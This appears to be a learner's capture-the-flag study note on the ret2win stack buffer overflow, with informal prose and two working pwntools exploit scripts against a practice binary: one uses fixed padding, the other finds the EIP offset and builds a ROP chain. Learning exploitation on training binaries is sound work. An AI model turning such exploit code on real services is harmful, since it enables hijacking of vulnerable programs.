### Ret2Win

Usually a function call with buffer is made, and by manipulating the stack we can manipulate the return address of the function call.
So as to do that what we mostly do is, find the address of the function we need to return to, and do magical stuff I am yet to read on
As to find how to overwrite the EIP, we can use cyclic command in gdb to achieve that, 
`cyclic 100` gives a cyclic pattern of 100 chracters where every 4th character is different, so if the EIP gets overwritten we can quickly find what overwrote it
and can generate a similar pattern again manually with the python or any magical thing

Also, once we find out the address of the function we can overflow the buffer and replace EIP with the function address to perform the BO

```
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './ret2win'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# How many bytes to the instruction pointer (EIP)?
padding = 28

payload = flat(
    b'A' * 28,
    elf.functions.hacked  # 0x401142
)

# Save the payload to file
write('payload.gen', payload)

# Send the payload
io.sendlineafter(b':', payload)

# Receive the flag
io.interactive()

```

There is also a ropster code prepared, that will automate the entire process of finding the cyclic patterns and exploiting them up

```
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './ret2win'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# We will send a 'cyclic' pattern which overwrites the return address on the stack
payload = cyclic(50)

# PWN
io.sendlineafter(b'Name:', payload)

# Wait for the process to crash
io.wait()

# Open up the corefile
core = io.corefile

# Print out the address of EIP at the time of crashing
eip_value = core.eip
eip_offset = cyclic_find(eip_value)
info('located EIP offset at {a}'.format(a=eip_offset))

# Create ROP object
rop = ROP(elf)
# Call the hacked function
rop.hacked()

# Dump out the rop structure
print(rop.dump())
# pprint(rop.gadgets)

# Get the raw bytes
rop_chain = rop.chain()

# Build payload
payload = flat({
    eip_offset: rop_chain
})

# Save payload to file
write('payload', payload)

# Start a new process
io = start()

# PWN
io.sendlineafter(b'Name:', payload)

# Receive the flag
io.interactive()
```


